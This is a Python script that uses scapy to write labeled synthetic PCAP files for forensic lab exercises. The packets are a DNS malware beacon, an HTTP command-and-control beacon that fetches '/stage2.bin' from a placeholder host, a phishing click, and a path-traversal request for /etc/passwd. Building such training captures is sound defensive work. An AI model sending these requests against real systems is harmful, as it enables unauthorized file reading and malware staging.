#!/usr/bin/env python3
"""Generate minimal, educationally labeled PCAP samples for lab scenarios."""

from __future__ import annotations

import argparse
import sys
from pathlib import Path

try:
    from scapy.all import DNS, DNSQR, IP, TCP, UDP, Ether, Raw, wrpcap

    _E = lambda: Ether(src="02:00:00:00:00:01", dst="02:00:00:00:00:02")
except ImportError:
    print("Install scapy: pip install scapy", file=sys.stderr)
    sys.exit(1)


def dns_beacon(dst_ip: str = "10.0.0.5", qname: str = "beacon.dyn-malware.example") -> list:
    pkt = (
        _E()
        / IP(src="192.168.1.100", dst="8.8.8.8")
        / UDP(sport=54321, dport=53)
        / DNS(rd=1, qd=DNSQR(qname=qname))
    )
    resp = (
        _E()
        / IP(src="8.8.8.8", dst="192.168.1.100")
        / UDP(sport=53, dport=54321)
        / DNS(
            qr=1,
            aa=1,
            qd=DNSQR(qname=qname),
            an=None,
        )
    )
    return [pkt, resp]


def http_c2_beacon(
    host: str = "malware-c2.example",
    uri: str = "/stage2.bin?id=a1b2",
    dport: int = 8080,
) -> list:
    """Simulated periodic HTTP GET beacon (lab only; synthetic hostnames)."""
    req = (
        "GET {} HTTP/1.1\r\n"
        "Host: {}\r\n"
        "User-Agent: Mozilla/5.0 (compatible; lab-beacon/1.0)\r\n"
        "Connection: close\r\n\r\n"
    ).format(uri, host)
    psh = (
        _E()
        / IP(src="192.168.1.101", dst="203.0.113.50")
        / TCP(sport=49152, dport=dport, flags="PA", seq=1, ack=1)
        / Raw(load=req.encode())
    )
    return [psh]


def phishing_http_link_click(
    dest: str = "87.51.100.10",
    host_hdr: str = "secure-login-verify.example",
) -> list:
    body = (
        "GET /submit?token=fakephish HTTP/1.1\r\n"
        f"Host: {host_hdr}\r\n"
        "Referer: http://legit-victim-portal.example/\r\n\r\n"
    )
    return [
        _E()
        / IP(src="192.168.50.20", dst=dest)
        / TCP(sport=51234, dport=80, flags="PA", seq=100, ack=50)
        / Raw(load=body.encode())
    ]


def web_exploit_attempt() -> list:
    payload = (
        "GET /cgi-bin/../../../etc/passwd HTTP/1.1\r\n"
        "Host: edge-web.example\r\n\r\n"
    )
    return [
        _E()
        / IP(src="198.51.100.77", dst="10.0.0.12")
        / TCP(sport=44444, dport=443, flags="PA", seq=1, ack=1)
        / Raw(load=payload.encode())
    ]


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", type=Path, default=Path("forensic_artifacts/pcaps"))
    args = ap.parse_args()
    out: Path = args.out
    out.mkdir(parents=True, exist_ok=True)

    wrpcap(str(out / "beacon_dns_lab.pcap"), dns_beacon())
    wrpcap(str(out / "c2_http_beacon_lab.pcap"), http_c2_beacon())
    wrpcap(str(out / "phishing_click_lab.pcap"), phishing_http_link_click())
    wrpcap(str(out / "web_exploit_path_traversal_lab.pcap"), web_exploit_attempt())
    print(f"Wrote PCAPs under {out.resolve()}")


if __name__ == "__main__":
    main()
